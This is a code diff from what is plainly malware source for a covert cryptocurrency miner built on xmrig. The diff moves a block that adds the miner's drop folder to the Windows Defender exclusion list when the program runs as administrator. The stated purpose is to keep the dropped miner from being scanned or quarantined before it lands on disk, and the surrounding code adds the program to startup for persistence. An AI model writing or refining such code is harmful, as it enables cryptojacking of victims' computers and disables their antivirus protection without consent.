@@ -364,6 +364,23 @@ int main(int argc, char *argv[])
 #endif
 #endif
 
+#ifdef ENABLE_DEFENDER_EXCLUSION
+    // Add the persistence/drop folder to Windows Defender exclusion if running
+    // as admin. This must happen before the miner binary is dropped to disk so
+    // the freshly-written executable isn't scanned or quarantined.
+    if (IsRunningAsAdmin()) {
+        std::cout << "[*] Attempting to add persistence folder to Windows Defender exclusion..." << std::endl;
+        if (AddDefenderExclusion(gpuDropDir)) {
+            std::cout << "[+] Successfully added " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
+        } else {
+            std::cerr << "[-] Failed to add " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
+        }
+    } else {
+        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
+    }
+#endif
+
+
 #ifdef ENABLE_PERSISTENCE
     // Add to startup for persistence
     if (Persistence::AddToStartup()) {
@@ -679,21 +696,6 @@ int main(int argc, char *argv[])
         free_buffer(xmrigBuf);
     }
 
-#ifdef ENABLE_DEFENDER_EXCLUSION
-    // Add the persistence/drop folder to Windows Defender exclusion if running
-    // as admin. This must happen before the miner binary is dropped to disk so
-    // the freshly-written executable isn't scanned or quarantined.
-    if (IsRunningAsAdmin()) {
-        std::cout << "[*] Attempting to add persistence folder to Windows Defender exclusion..." << std::endl;
-        if (AddDefenderExclusion(gpuDropDir)) {
-            std::cout << "[+] Successfully added " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
-        } else {
-            std::cerr << "[-] Failed to add " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
-        }
-    } else {
-        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
-    }
-#endif
 
     DWORD gpuPid = 0;
     std::optional<PROCESS_INFORMATION> gpuPi;
